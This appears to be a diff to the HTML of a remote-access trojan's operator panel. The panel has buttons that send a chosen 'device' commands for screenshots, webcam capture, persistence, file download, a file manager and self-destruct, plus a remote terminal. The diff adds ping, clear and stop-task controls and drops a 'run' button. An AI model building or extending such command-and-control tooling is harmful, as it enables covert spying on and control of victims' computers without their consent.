@@ -68,11 +68,11 @@ if (!isAuthenticated()) {
                 <div class="cd"><div class="ch">&#9889; Quick Actions</div>
                 <div class="cb">
                     <div class="qb">
+                        <button class="btn btn-xs btn-g" onclick="qc('ping')">&#10003; ping</button>
                         <button class="btn btn-xs btn-gh" onclick="qc('pwd')">pwd</button>
                         <button class="btn btn-xs btn-b" onclick="qc('screenshot')">&#128247; screenshot</button>
                         <button class="btn btn-xs btn-b" onclick="qc('cam')">&#128248; cam</button>
                         <button class="btn btn-xs btn-gh" onclick="qc('persist')">persist</button>
-                        <button class="btn btn-xs btn-gh" onclick="qc('run')">&#9654; run</button>
                         <button class="btn btn-xs btn-gh" onclick="qc('download')">&#11015; dl</button>
                         <button class="btn btn-xs btn-r" onclick="if(confirm('Destroy?'))qc('selfdestruct')">&#128128; kill</button>
                         <button class="btn btn-xs btn-b" onclick="fmToggle()">&#128193; FM</button>
@@ -118,10 +118,10 @@ if (!isAuthenticated()) {
     </div>
 
     <div class="tc" id="tc">
-        <div class="th">&#9001; Terminal <span class="th-n" id="th-n">-</span></div>
+        <div class="th">&#9001; Terminal <span class="th-n" id="th-n">-</span> <button class="btn btn-xs btn-gh" onclick="clearTerminal()" style="margin-left:auto" title="Clear terminal">&#9003;</button> <button class="btn btn-xs btn-r" onclick="cancelTask()" title="Cancel last pending task">&#9632; Stop</button></div>
         <div class="to" id="tout"><div class="l s">Select a device.</div></div>
         <div class="ti">
-            <input id="tin" placeholder="shell whoami, browse, screenshot..." onkeydown="if(event.key==='Enter')dc()">
+            <input id="tin" placeholder="whoami, ls, screenshot..." onkeydown="tk(event)">
             <button class="btn btn-g" onclick="dc()">&#10148;</button>
         </div>
     </div>
